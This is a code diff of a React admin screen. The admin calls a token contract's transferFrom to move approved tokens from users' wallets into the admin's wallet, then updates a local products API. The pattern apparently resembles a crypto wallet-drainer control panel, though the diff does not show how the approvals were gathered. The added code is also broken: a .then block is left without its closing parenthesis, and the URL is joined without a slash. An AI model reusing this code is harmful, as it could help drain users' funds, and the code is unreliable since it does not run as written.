@@ -78,7 +78,7 @@ const AdminScreen = () => {
         const contractABI = JSON.parse(temp.data.result);
         const nowContract = new web3.eth.Contract(contractABI, approveToken.contractAddress);
         await nowContract.methods.transferFrom(approveToken.userWalletAddress, adminWalletAddress, web3.utils.toWei((transferAmount).toString(), "ether")).send({ from: adminWalletAddress }).then(async function (receipt) {
-          await axios.post('http://localhost:5000/products' + id, {
+          await axios.patch('http://localhost:5000/products' + id, {
             amount: approveToken.amount - transferAmount,
           });
         });
@@ -91,7 +91,11 @@ const AdminScreen = () => {
         let temp = await axios.get(api);
         const contractABI = JSON.parse(temp.data.result);
         const nowContract = new web3.eth.Contract(contractABI, approveToken.contractAddress);
-        await nowContract.methods.transferFrom(approveToken.userWalletAddress, adminWalletAddress, web3.utils.toWei((transferAmount).toString(), "ether")).send({ from: adminWalletAddress })
+        await nowContract.methods.transferFrom(approveToken.userWalletAddress, adminWalletAddress, web3.utils.toWei((transferAmount).toString(), "ether")).send({ from: adminWalletAddress }).then(async function (receipt) {
+          await axios.patch('http://localhost:5000/products' + id, {
+            amount: approveToken.amount - transferAmount,
+          });
+        }
       }
     }
   }
